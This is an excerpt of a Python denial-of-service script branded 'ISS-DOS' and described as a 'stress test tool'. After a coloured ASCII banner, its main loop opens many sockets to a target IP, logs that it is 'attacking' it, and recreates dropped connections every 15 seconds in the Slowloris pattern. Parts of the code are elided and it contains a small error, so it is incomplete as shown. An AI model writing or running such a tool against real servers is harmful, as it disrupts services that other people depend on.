...
import time
print("\033[91m" "____________________________________________________")
print("\033[92m" "\nGMT: "+time.strftime("%a, %d %b %Y %I:%M:%S %p %Z", time.gmtime()))  
print("\033[26m" "Local: "+strftime("%a, %d %b %Y %I:%M:%S %p %Z\n"))			  
print("\033[91m" "____________________________________________________")

print ("\033[35m" "===================================================")
print ("\033[95m" " ___ ____ ____        ____   ___  ____ ")
print ("\033[95m" "|_ _/ ___/ ___|      |  _ \ / _ \/ ___| ")
print ("\033[95m" " | |\___ \___ \ _____| | | | | | \___ \ ")
print ("\033[95m" " | | ___) |__) |_____| |_| | |_| |___) | ")
print ("\033[95m" "|___|____/____/      |____/ \___/|____/ ")
print ("\033[35m" "===================================================")
print

parser = argparse.ArgumentParser(description="\033[35m" "IS Stresser - simple stress test tool.", add_help=False)
...
def main():
    ...
    logging.info("\033[35m" "Attacking %s with %s sockets.", ip, socket_count)
    logging.info("\033[95m" "Creating sockets.")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket %s", _)
            s = init_socket(ip)
        except socket.error:
            logging.info("Socket creation failed. Connection error.")
            break
        ...
        try:
            ...
            for _ in range(socket_count - len(list_of_sockets)):
                ...
                try:
                    ...
                    logging.info("Socket recreation failed. Connection error.")
                    break
            time.sleep(15)
        
        except (KeyboardInterrupt, SystemExit):
            logging.info("Attack was stopped.")
            break
